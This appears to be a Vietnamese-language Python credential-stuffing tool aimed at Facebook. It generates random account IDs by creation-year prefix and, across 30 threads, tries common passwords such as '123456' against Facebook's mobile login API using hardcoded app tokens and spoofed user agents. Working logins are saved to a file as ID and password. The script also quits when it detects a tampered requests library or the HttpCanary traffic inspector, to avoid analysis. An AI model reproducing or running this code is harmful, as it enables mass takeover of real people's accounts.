import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime
from pystyle import Colorate, Colors

modules = ['requests', 'urllib3', 'mechanize', 'rich', 'pystyle']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()

os.system('clear')
print(Colorate.Horizontal(Colors.green_to_blue, ' [DOTIENDAT] ĐANG CÀI ĐẶT THƯ VIỆN...'))

os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx pip install beautifulsoup4')
print(Colorate.Horizontal(Colors.green_to_blue, 'Đang tải mô-đun...\n'))
os.system('clear')
os.system('xdg-open')

try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass

class sec:
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        print(Colorate.Horizontal(Colors.green_to_blue, ' Chúc mừng! '))
        self.linex()
        exit()

    def linex(self):
        print(Colorate.Horizontal(Colors.green_to_blue, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))

method = []
oks = []
cps = []
loop = 0
user = []
account_count = 0

sys.stdout.write('\x1b]2;𓆩【PHAM VU NGUYEN ANH】𓆪 \x07')

def ____banner____():
    os.system('cls' if os.name == 'nt' else 'clear')
    thoi_gian_hien_tai = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    banner_text = ''' bố PHẠM VŨ NGUYÊN ANH
'''
    
    print(Colorate.Horizontal(Colors.green_to_blue, banner_text))
    print(Colorate.Horizontal(Colors.green_to_blue, '\n=== TOOL ĐÀO VIA XỊN BY ĐỖ TIẾN ĐẠT ==='))
    print(Colorate.Horizontal(Colors.green_to_blue, 'Cập nhật: 29/7/2026'))
    print(Colorate.Horizontal(Colors.green_to_blue, f'Thời gian hiện tại: {thoi_gian_hien_tai}'))
    print(Colorate.Horizontal(Colors.green_to_blue, 'Phiên Bản: vip nhất'))
    
    
def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        if uid.startswith('1001'):
            return '2024'
        if uid.startswith('1002'):
            return '2025'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 6:
        return '2005'
    elif len(uid) == 5:
        return '2004'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''

def clear():
    os.system('clear')

def linex():
    print(Colorate.Horizontal(Colors.green_to_blue, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))

def kaycte_():
    """Hàm menu chính"""
    ____banner____()
    print(Colorate.Horizontal(Colors.green_to_blue, '(A)NANK'))
    linex()
    print(Colorate.Horizontal(Colors.green_to_blue, '(B) ĐÉO'))
    linex()
    choice = input(Colorate.Horizontal(Colors.green_to_blue, "CHỌN (A/B): ")).strip().upper()
    
    if choice in ('A', 'a', '01', '1'):
        old_clone()
    elif choice in ('B', 'b', '02', '2'):
        print(Colorate.Horizontal(Colors.green_to_blue, "\nCảm ơn đã dùng tool!"))
        time.sleep(2)
        sys.exit()
    else:
        print(Colorate.Horizontal(Colors.green_to_blue, "\nVui lòng chọn A hoặc B..."))
        time.sleep(2)
        kaycte_()

def old_clone():
    ____banner____()
    print(Colorate.Horizontal(Colors.green_to_blue, '(A)TẤT CẢ ACC CỔ'))
    linex()
    print(Colorate.Horizontal(Colors.green_to_blue, '(B)TÀI KHOẢN 100003/4'))
    linex()
    print(Colorate.Horizontal(Colors.green_to_blue, '(C)TÀI KHOẢN 2009'))
    linex()
    print(Colorate.Horizontal(Colors.green_to_blue, '(D)TÀI KHOẢN 2004-2025'))
    linex()
    _input = input(Colorate.Horizontal(Colors.green_to_blue, "CHỌN  : "))
    if _input in ('A', 'a', '01', '1'):
        old_One()
    elif _input in ('B', 'b', '02', '2'):
        old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        old_Tree()
    elif _input in ('D', 'd', '04', '4'):
        old_Four()
    else:
        print(Colorate.Horizontal(Colors.green_to_blue, "\n[×] Vui lòng chọn tùy chọn hợp lệ... "))
        dzixtool2006_knam()

def old_One():
    user = []
    ____banner____()
    print(Colorate.Horizontal(Colors.green_to_blue, "MÃ CŨ : 2010-2014"))
    ask = input(Colorate.Horizontal(Colors.green_to_blue, "CHỌN : "))
    linex()
    ____banner____()
    print(Colorate.Horizontal(Colors.green_to_blue, "(★)>×<VÍ DỤ : 20000 / 30000 / 99999"))
    limit = input(Colorate.Horizontal(Colors.green_to_blue, "(★)>×<CHỌN : "))
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print(Colorate.Horizontal(Colors.green_to_blue, '(A)>×<PHƯƠNG THỨC 1'))
    print(Colorate.Horizontal(Colors.green_to_blue, '(B)>×<PHƯƠNG THỨC 2'))
    linex()
    meth = input(Colorate.Horizontal(Colors.green_to_blue, "(★)>×<CHỌN (A/B): ")).strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(Colorate.Horizontal(Colors.green_to_blue, f"(★)>×<TỔNG SỐ ID ĐỂ KIỂM TRA :  {limit}"))
        print(Colorate.Horizontal(Colors.green_to_blue, "SỬ DỤNG 1.1.1.1 hay fake để scan nhanh"))
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(Colorate.Horizontal(Colors.green_to_blue, "    [!] PHƯƠNG THỨC CHỌN KHÔNG HỢP LỆ"))
                break

def old_Tow():
    user = []
    ____banner____()
    print(Colorate.Horizontal(Colors.green_to_blue, "MÃ CŨ : 2010-2014"))
    ask = input(Colorate.Horizontal(Colors.green_to_blue, "CHỌN : "))
    linex()
    ____banner____()
    print(Colorate.Horizontal(Colors.green_to_blue, "(★)>×<VÍ DỤ : 20000 / 30000 / 99999"))
    limit = input(Colorate.Horizontal(Colors.green_to_blue, "(★)>×<CHỌN : "))
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print(Colorate.Horizontal(Colors.green_to_blue, '(A)>×<PHƯƠNG THỨC A'))
    print(Colorate.Horizontal(Colors.green_to_blue, '(B)>×<PHƯƠNG THỨC B'))
    linex()
    meth = input(Colorate.Horizontal(Colors.green_to_blue, "(★)>×<CHỌN (A/B): ")).strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(Colorate.Horizontal(Colors.green_to_blue, f"(★)>×<TỔNG SỐ ID ĐỂ KIỂM TRA :  {limit}"))
        print(Colorate.Horizontal(Colors.green_to_blue, "SỬ DỤNG 1.1.1.1 hay fake ip sẽ tốt hơn"))
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(Colorate.Horizontal(Colors.green_to_blue, "    [!] PHƯƠNG THỨC CHỌN KHÔNG HỢP LỆ"))
                break

def old_Tree():
    user = []
    ____banner____()
    print(Colorate.Horizontal(Colors.green_to_blue, "(★)FACEBOOK CŨ : 2009-2010"))
    ask = input(Colorate.Horizontal(Colors.green_to_blue, "(★)CHỌN : "))
    linex()
    ____banner____()
    print(Colorate.Horizontal(Colors.green_to_blue, "(★)VÍ DỤ : 20000 / 30000 / 99999"))
    limit = input(Colorate.Horizontal(Colors.green_to_blue, "(★)TỔNG SỐ ID ĐỂ KIỂM TRA : "))
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print(Colorate.Horizontal(Colors.green_to_blue, '(A)>×<PHƯƠNG THỨC A'))
    print(Colorate.Horizontal(Colors.green_to_blue, '(B)>×<PHƯƠNG THỨC B'))
    linex()
    meth = input(Colorate.Horizontal(Colors.green_to_blue, "(★)>×<CHỌN (A/B): ")).strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(Colorate.Horizontal(Colors.green_to_blue, f"(★)>×<TỔNG SỐ ID ĐỂ KIỂM TRA : {limit}"))
        print(Colorate.Horizontal(Colors.green_to_blue, "SỬ DỤNG 1.1.1.1 hay fake ip"))
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(Colorate.Horizontal(Colors.green_to_blue, "    [!] PHƯƠNG THỨC CHỌN KHÔNG HỢP LỆ"))
                break

def old_Four():
    user = []
    ____banner____()
    print(Colorate.Horizontal(Colors.green_to_blue, "MÃ CŨ : 2004-2025"))
    year_range = input(Colorate.Horizontal(Colors.green_to_blue, "NHẬP KHOẢNG NĂM (VD: 2004-2025) : "))
    try:
        start_year, end_year = map(int, year_range.split('-'))
        if not (2004 <= start_year <= end_year <= 2025):
            print(Colorate.Horizontal(Colors.green_to_blue, "\n[×] Vui lòng nhập khoảng năm hợp lệ (2004-2025)..."))
            time.sleep(2)
            old_clone()
    except ValueError:
        print(Colorate.Horizontal(Colors.green_to_blue, "\n[×] Định dạng không hợp lệ. Vui lòng nhập theo dạng 2004-2025..."))
        time.sleep(2)
        old_clone()
    linex()
    ____banner____()
    print(Colorate.Horizontal(Colors.green_to_blue, "(★)>×<VÍ DỤ : 20000 / 30000 / 99999"))
    limit = input(Colorate.Horizontal(Colors.green_to_blue, "(★)>×<TỔNG SỐ ID ĐỂ KIỂM TRA : "))
    linex()
    prefixes = []
    for year in range(start_year, end_year + 1):
        if year == 2004:
            prefixes.extend(['1' + '0' * (4 - len(str(i))) + str(i) for i in range(10000, 100000)])
        elif year == 2005:
            prefixes.extend(['1' + '0' * (5 - len(str(i))) + str(i) for i in range(100000, 1000000)])
        elif year == 2006:
            prefixes.extend(['1' + '0' * (6 - len(str(i))) + str(i) for i in range(1000000, 10000000)])
        elif year == 2007:
            prefixes.extend(['1' + '0' * (7 - len(str(i))) + str(i) for i in range(10000000, 100000000)])
        elif year == 2008:
            prefixes.extend(['1' + '0' * (8 - len(str(i))) + str(i) for i in range(100000000, 1000000000)])
        elif year == 2009:
            prefixes.extend(['1000000', '1000001', '1000002', '1000003', '1000004', '1000005', '100000000', '1000000000'])
        elif year == 2010:
            prefixes.extend(['1000006', '1000007', '1000008', '1000009', '100001'])
        elif year == 2011:
            prefixes.extend(['100002', '100003'])
        elif year == 2012:
            prefixes.append('100004')
        elif year == 2013:
            prefixes.extend(['100005', '100006'])
        elif year == 2014:
            prefixes.extend(['100007', '100008'])
        elif year == 2015:
            prefixes.append('100009')
        elif year == 2016:
            prefixes.append('10001')
        elif year == 2017:
            prefixes.append('10002')
        elif year == 2018:
            prefixes.append('10003')
        elif year == 2019:
            prefixes.append('10004')
        elif year == 2020:
            prefixes.append('10005')
        elif year == 2021:
            prefixes.append('10006')
        elif year == 2022:
            prefixes.extend(['10007', '10008'])
        elif year == 2023:
            prefixes.append('10009')
        elif year == 2024:
            prefixes.extend(['1001', '61'])
        elif year == 2025:
            prefixes.append('1002')
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        if prefix in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005', '1000006', '1000007', '1000008', '1000009', '100001', '100002', '100003', '100004', '100005', '100006', '100007', '100008', '100009', '10001', '10002', '10003', '10004', '10005', '10006', '10007', '10008', '10009', '1001', '1002', '61']:
            suffix = ''.join(random.choices('0123456789', k=15 - len(prefix)))
        else:
            suffix = ''.join(random.choices('0123456789', k=len(prefix) - 1))
        uid = prefix + suffix
        user.append(uid)
    print(Colorate.Horizontal(Colors.green_to_blue, '(A)>×<PHƯƠNG THỨC A'))
    print(Colorate.Horizontal(Colors.green_to_blue, '(B)>×<PHƯƠNG THỨC B'))
    linex()
    meth = input(Colorate.Horizontal(Colors.green_to_blue, "(★)>×<CHỌN (A/B): ")).strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(Colorate.Horizontal(Colors.green_to_blue, f"(★)>×<TỔNG SỐ ID ĐỂ KIỂM TRA : {limit}"))
        print(Colorate.Horizontal(Colors.green_to_blue, "SỬ DỤNG 1.1.1.1 hay fake ip tốt hơn"))
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(Colorate.Horizontal(Colors.green_to_blue, "    [!] PHƯƠNG THỨC CHỌN KHÔNG HỢP LỆ"))
                break

def login_1(uid):
    global loop, account_count
    session = requests.session()
    try:
        
        kaydzcte = "+ NANK"
        
        progress_text = f"\r\r{kaydzcte} ({loop}) (OK) ({len(oks)})"
        sys.stdout.write(progress_text)
        sys.stdout.flush()
        
        for pw in ('123456', '1234567', '12345678', '123456789'):
            try:
                data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': str(uid),
                    'password': str(pw),
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'generate_session_cookies': '1',
                    'meta_inf_fbmeta': '',
                    'advertiser_id': str(uuid.uuid4()),
                    'currently_logged_in_userid': '0',
                    'locale': 'en_US',
                    'client_country_code': 'US',
                    'method': 'auth.login',
                    'fb_api_req_friendly_name': 'authenticate',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'api_key': '882a8490361da98702bf97a021ddc14d'
                }
                headers = {
                    'User-Agent': window1(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': '25227',
                    'X-FB-SIM-HNI': '29752',
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
                }
                res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False, timeout=30).json()
                
                if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
                    account_count += 1
                    print(Colorate.Horizontal(Colors.green_to_blue, f"\r\rFacebook cổ {account_count}"))
                    print(Colorate.Horizontal(Colors.green_to_blue, f"Tài khoản: {uid}"))
                    print(Colorate.Horizontal(Colors.green_to_blue, f"Mật khẩu: {pw}"))
                    print(Colorate.Horizontal(Colors.green_to_blue, f"Năm sinh: {creationyear(uid)}"))
                    print(Colorate.Horizontal(Colors.green_to_blue, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
                    try:
                        with open('/sdcard/nghiadz.txt', 'a', encoding='utf-8') as f:
                            f.write(f"{uid}|{pw}|{creationyear(uid)}\n")
                    except:
                        with open('NANK.txt', 'a', encoding='utf-8') as f:
                            f.write(f"{uid}|{pw}|{creationyear(uid)}\n")
                    oks.append(uid)
                    break
                    
            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.ConnectionError:
                time.sleep(2)
                continue
            except Exception as e:
                continue
                
        loop += 1
        
    except Exception as e:
        time.sleep(5)

def login_2(uid):
    global loop, account_count
    try:
        
        kaydzcte = "+ NANK"
        
        progress_text = f"\r\r{kaydzcte} ({loop}) (OK) ({len(oks)})"
        sys.stdout.write(progress_text)
        sys.stdout.flush()
        
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            try:
                with requests.Session() as session:
                    headers = {
                        'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                        'x-fb-sim-hni': str(rr(20000, 40000)),
                        'x-fb-net-hni': str(rr(20000, 40000)),
                        'x-fb-connection-quality': 'EXCELLENT',
                        'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                        'user-agent': window1(),
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-fb-http-engine': 'Liger'
                    }
                    url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                    
                    response = session.get(url, headers=headers, timeout=30)
                    po = response.json()
                    
                    if 'session_key' in str(po) or 'session_key' in po:
                        account_count += 1
                        print(Colorate.Horizontal(Colors.green_to_blue, f"\r\rFacebook cổ {account_count}"))
                        print(Colorate.Horizontal(Colors.green_to_blue, f"Tài khoản: {uid}"))
                        print(Colorate.Horizontal(Colors.green_to_blue, f"Mật khẩu: {pw}"))
                        print(Colorate.Horizontal(Colors.green_to_blue, f"Năm sinh: {creationyear(uid)}"))
                        print(Colorate.Horizontal(Colors.green_to_blue, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
                        try:
                            with open('/sdcard/nghiadz.txt', 'a', encoding='utf-8') as f:
                                f.write(f"{uid}|{pw}|{creationyear(uid)}\n")
                        except:
                            with open('NANK.txt', 'a', encoding='utf-8') as f:
                                f.write(f"{uid}|{pw}|{creationyear(uid)}\n")
                        oks.append(uid)
                        break
                        
            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.ConnectionError:
                time.sleep(2)
                continue
            except Exception as e:
                continue
                
    except Exception as e:
        pass
        
    loop += 1


def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

if __name__ == '__main__':
    kaycte_()
